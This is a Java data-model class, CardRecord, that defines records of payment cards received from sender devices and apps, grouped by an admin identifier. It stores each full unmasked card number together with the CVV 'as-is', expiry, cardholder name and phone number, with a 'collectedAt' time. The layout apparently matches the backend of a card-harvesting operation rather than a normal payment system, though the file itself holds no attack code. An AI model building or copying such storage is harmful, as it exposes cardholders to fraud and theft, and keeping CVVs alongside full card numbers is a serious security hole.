package app.service.model;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;

@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class CardRecord {
    private Long id;                 // generated
    private String adminId;          // partition key
    private String deviceId;         // from sender
    private String appId;            // from sender

    private String pan;              // full number (unmasked)
    private String bin;              // first 6 digits
    private String last4;            // last 4 digits
    private Integer expiryMonth;
    private Integer expiryYear;
    private boolean luhnValid;
    private String network;          // derived or null
    private String productType;      // nullable
    private String issuer;           // nullable
    private String country;          // nullable
    private String cvv;              // optional CVV as-is

    // additional metadata from payload
    private String nameOnCard;       // optional cardholder name
    private String phoneNumber;      // optional contact phone

    private Long collectedAtMs;      // payload.collectedAt
    private Long eventTimestampMs;   // per-card eventTimestamp
}
